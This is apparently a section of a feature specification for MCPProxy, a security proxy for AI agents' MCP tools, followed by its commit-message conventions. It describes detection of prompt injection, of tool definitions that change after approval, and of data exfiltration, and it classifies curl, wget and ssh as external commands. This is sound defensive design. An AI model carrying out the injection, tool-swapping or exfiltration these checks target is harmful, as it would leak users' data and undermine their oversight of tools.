- **Stdio-to-Proxy Bridge**: A lightweight binary that accepts MCP stdio JSON-RPC on stdin/stdout and forwards to MCPProxy's HTTP endpoint. This enables MCPProxy to firewall stdio-only agents (like Claude Desktop, local Goose instances) without changing their MCP server configuration.
- **Rug Pull Detection**: Tool fingerprinting with SHA256 hashes of description + schema + annotations, detecting when tool definitions change after user approval.
- **Contradiction Detection**: Multi-signal verification comparing agent intent, tool name heuristics, server annotations, and argument analysis to detect when signals disagree (indicating prompt injection).
- **OpenTelemetry Export**: OTel-compatible export from the activity log for integration with enterprise observability platforms (Grafana, Splunk).
- **Bash Command Parsing**: Heuristic parsing of `Bash` command strings to classify individual commands as internal (`cat`, `ls`) vs external (`curl`, `wget`, `ssh`) for more precise hybrid tool classification.

## Commit Message Conventions *(mandatory)*

When committing changes for this feature, follow these guidelines:

### Issue References
- Use: `Related #[issue-number]` - Links the commit to the issue without auto-closing
- Do NOT use: `Fixes #[issue-number]`, `Closes #[issue-number]`, `Resolves #[issue-number]` - These auto-close issues on merge

**Rationale**: Issues should only be closed manually after verification and testing in production, not automatically on merge.

### Co-Authorship
- Do NOT include: `Co-Authored-By: Claude <noreply@anthropic.com>`
- Do NOT include: "Generated with Claude Code"

**Rationale**: Commit authorship should reflect the human contributors, not the AI tools used.

### Example Commit Message
```
feat(security): add data flow tracking for exfiltration detection

Related #[issue-number]

Implement content hashing and cross-tool data flow analysis to detect
internal→external data movement patterns (lethal trifecta defense).

## Changes
- Add server/tool classification heuristics
- Implement content hashing at multiple granularities
- Add data flow tracker with per-session state
- Add policy engine for flow decisions

## Testing
- Deterministic flow scenarios covering 5 attack patterns
- E2E test for hook evaluate endpoint
- Unit tests for classification and hashing
```
